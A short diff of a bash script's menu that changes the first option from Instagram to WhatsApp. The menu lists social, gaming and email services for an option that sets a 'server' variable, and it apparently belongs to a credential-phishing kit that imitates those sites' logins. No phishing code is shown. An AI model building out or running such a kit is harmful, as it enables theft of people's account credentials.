@@ -17,7 +17,7 @@ command -v toilet > /dev/null 2>&1 || { echo >&2 "I Require toilet But It's Not 
 
 menu() {
 
-printf "\e[1;36m[\e[0m\e[1;92m01\e[0m\e[1;36m]\e[0m\e[1;34m Instagram\e[0m      \e[1;36m[\e[0m\e[1;92m09\e[0m\e[1;36m]\e[0m\e[1;34m Origin\e[0m          \e[1;36m[\e[0m\e[1;92m17\e[0m\e[1;36m]\e[0m\e[1;34m Gitlab\e[0m\n"
+printf "\e[1;36m[\e[0m\e[1;92m01\e[0m\e[1;36m]\e[0m\e[1;34m WhatsApp\e[0m      \e[1;36m[\e[0m\e[1;92m09\e[0m\e[1;36m]\e[0m\e[1;34m Origin\e[0m          \e[1;36m[\e[0m\e[1;92m17\e[0m\e[1;36m]\e[0m\e[1;34m Gitlab\e[0m\n"
 printf "\e[1;36m[\e[0m\e[1;92m02\e[0m\e[1;36m]\e[0m\e[1;34m Facebook\e[0m       \e[1;36m[\e[0m\e[1;92m10\e[0m\e[1;36m]\e[0m\e[1;34m Steam\e[0m           \e[1;36m[\e[0m\e[1;92m18\e[0m\e[1;36m]\e[0m\e[1;34m Pinterest\e[0m\n"
 printf "\e[1;36m[\e[0m\e[1;92m03\e[0m\e[1;36m]\e[0m\e[1;34m Snapchat\e[0m       \e[1;36m[\e[0m\e[1;92m11\e[0m\e[1;36m]\e[0m\e[1;34m Yahoo\e[0m           \e[1;36m[\e[0m\e[1;92m19\e[0m\e[1;36m]\e[0m\e[1;34m Custom\e[0m\n"
 printf "\e[1;36m[\e[0m\e[1;92m04\e[0m\e[1;36m]\e[0m\e[1;34m Twitter\e[0m        \e[1;36m[\e[0m\e[1;92m12\e[0m\e[1;36m]\e[0m\e[1;34m Linkedin\e[0m        \e[1;36m[\e[0m\e[1;92m99\e[0m\e[1;36m]\e[0m\e[1;34m Exit\e[0m\n"
@@ -28,7 +28,7 @@ printf "\e[1;36m[\e[0m\e[1;92m08\e[0m\e[1;36m]\e[0m\e[1;34m Netflix\e[0m        
 read -p $'\n\e[1;36m[\e[0m\e[1;92m*\e[0m\e[1;36m]\e[0m\e[1;92m Choose an option: \e[0m' option
 
 if [[ $option == 1 || $option == 01 ]]; then
-server="instagram"
+server="WhatsApp"
 start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
